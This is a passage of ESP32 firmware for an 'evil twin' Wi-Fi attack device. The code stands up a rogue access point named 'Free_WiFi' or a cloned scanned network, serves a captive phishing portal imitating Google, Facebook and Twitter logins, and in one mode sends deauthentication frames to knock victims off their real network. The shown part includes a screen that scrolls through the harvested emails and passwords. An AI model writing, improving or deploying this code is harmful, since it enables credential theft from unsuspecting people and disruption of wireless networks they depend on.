      int idx = captureScrollIndex + i;
      String u, pw;
      if (captures[idx].provider.length() > 0) {
        String p = captures[idx].provider.substring(0, 1);
        p.toUpperCase();
        u = p + ": " + captures[idx].value;
        pw = "P: " + captures[idx].password;
      } else {
        String prefix = (captures[idx].type == "email") ? "A" : "P";
        u = prefix + ": " + captures[idx].value;
        pw = "P: " + captures[idx].password;
      }
      u8g2.drawStr(0, 25 + (i * 20), u.c_str());
      u8g2.drawStr(8, 35 + (i * 20), pw.c_str());
    }
    if (captureScrollIndex > 0)
      u8g2.drawStr(120, 25, "^");
    if (captureScrollIndex + 2 < captureCount)
      u8g2.drawStr(120, 55, "v");
  }
  u8g2.drawStr(0, 63, "U/D: Scroll | C: Exit");
  u8g2.sendBuffer();
}

void handleViewLogsInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (captureScrollIndex > 0) captureScrollIndex--;
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (captureScrollIndex + 2 < captureCount) captureScrollIndex++;
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_SELECT_PIN) == LOW || digitalRead(BTN_PIN_LEFT) == LOW) {
      modeSelected = false;
      logsLoaded = false;
      captureCount = 0;
      lastDebounceTime = now;
    }
  }
}

// ---- Setup & Loop ----
void eviltwinSetup() {
  Serial.begin(115200);
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_PIN_LEFT, INPUT_PULLUP);
  pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BUTTON_SELECT_PIN, INPUT_PULLUP);
  esp_bt_controller_deinit();
  WiFi.disconnect();
  // Reset all state
  serverActive = false;
  modeSelected = false;
  portalConfigured = false;
  portalLanguage = 0;
  enableGoogle = true;
  enableFacebook = true;
  enableTwitter = true;
  configIndex = 0;
  presetChosen = false;
  logsLoaded = false;
  useCustomSSID = false;
  presetIndex = 0;
  presetScroll = 0;
  scanDone = false;
  targetSelected = false;
  newCredentials = false;
  captureCount = 0;
  captureScrollIndex = 0;
  charIndex = 0;
  strcpy(customSSID, "Free_WiFi");
  ssidLen = 9;
  for (int i = 0; i < MAX_CAPTURES; i++)
    captures[i] = {"", "", "", "", "", 0, ""};
  setNeoPixelColour("purple");
}

void eviltwinLoop() {
  // Phase 0: Mode selection
  if (!modeSelected) {
    handleModeInput();
    drawModeMenu();
    return;
  }

  // Phase 0.1: View Logs (Mode 3)
  if (evilTwinMode == 3 && modeSelected) {
    handleViewLogsInput();
    drawViewLogsScreen();
    return;
  }

  // Phase 0.5: Portal config for Mode 2
  if (evilTwinMode == 2 && !portalConfigured) {
    handleMode2ConfigInput();
    drawMode2ConfigMenu();
    return;
  }

  // Phase 1: SSID selection (mode-specific)
  if (!serverActive) {
    if (evilTwinMode == 0 || evilTwinMode == 2) {
      // Mode 0 or 2: Preset list, then optional custom keyboard
      if (!presetChosen) {
        handlePresetInput();
        drawPresetMenu();
        return;
      }
      if (useCustomSSID) {
        handleKeyboardInput();
        drawKeyboard();
        return;
      }
    } else {
      // Mode 1: WiFi scan & target selection
      if (!scanDone) {
        doWifiScan();
        return;
      }
      if (!targetSelected) {
        handleScanInput();
        drawScanScreen();
        return;
      }
    }
    return;
  }

  // Phase 2: Server active
  dnsServer.processNextRequest();
  webServer.handleClient();
  sendDeauth(); // Only sends in Mode 1
  drawServerScreen();

  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (captureScrollIndex > 0)
        captureScrollIndex--;
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (captureScrollIndex + (evilTwinMode == 2 ? 2 : 4) < captureCount)
        captureScrollIndex++;
      lastDebounceTime = now;
    }
  }

  if (digitalRead(BUTTON_SELECT_PIN) == LOW) {
    if (now - lastDebounceTime > debounceDelay * 2) {
      WiFi.softAPdisconnect(true);
      serverActive = false;
      setNeoPixelColour("0");
      lastDebounceTime = now;
      while (digitalRead(BUTTON_SELECT_PIN) == LOW)
        delay(10);
    }
  }
}

} // namespace EvilTwin
